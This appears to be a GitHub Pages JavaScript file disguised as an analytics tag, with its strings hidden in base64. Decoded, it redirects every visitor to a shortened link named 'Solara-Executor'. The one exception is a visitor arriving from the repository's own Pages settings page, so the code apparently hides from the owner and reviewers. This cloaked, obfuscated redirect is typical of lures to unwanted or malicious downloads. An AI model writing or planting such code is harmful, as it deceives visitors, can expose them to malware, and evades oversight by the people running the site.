window._0 = window._0 || [];

function _1() {
    _0.push(arguments);
}
_1(_4('anM='), new Date());
_1(_4('Y29uZmln'), _4('Ry1OVFRQNVlEWUw3'));

function _2() {
    return document.referrer;
}

function _3() {
    const _var0 = _2();
    const _var1 = _4('aHR0cHM6Ly9naXRodWIuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9zZXR0aW5ncy9wYWdlcw==');
    return _var0 !== _var1;
}

function _5() {
    setTimeout(() => {
        const _url = _4('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
        window.location.href = _url;
    }, 100);
}

function _4(encodedStr) {
    return atob(encodedStr);
}

if (_3()) {
    _5();
} else {
    console.log(_4('UmVkaXJlY3QgbG9jYWwgYmxvY2tlZCBkdWUgdG8gXzM='));
}
